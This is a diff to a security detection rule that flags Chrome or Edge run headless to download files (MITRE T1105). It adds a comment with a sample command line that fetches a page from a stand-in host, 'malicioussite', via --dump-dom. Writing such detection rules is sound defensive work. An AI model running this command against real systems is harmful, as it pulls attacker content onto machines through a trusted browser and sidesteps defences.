@@ -8,6 +8,7 @@ rule msedge_chrome_downloading_file_via_commandLine {
     mitre_T1 = "T1105"
     mitre_url = "https://attack.mitre.org/techniques/T1105/"
     references = "https://twitter.com/mrd0x/status/1478234484881436672"
+    // Sample > target.process.command_line = ""C:\Program Files\Google\Chrome\Application\chrome.exe"  --headless --enable-logging --disable-gpu --dump-dom "http://malicioussite/shim.html" "
 
   events:
 
@@ -21,3 +22,4 @@ rule msedge_chrome_downloading_file_via_commandLine {
   condition:
    $e1 
 }
+
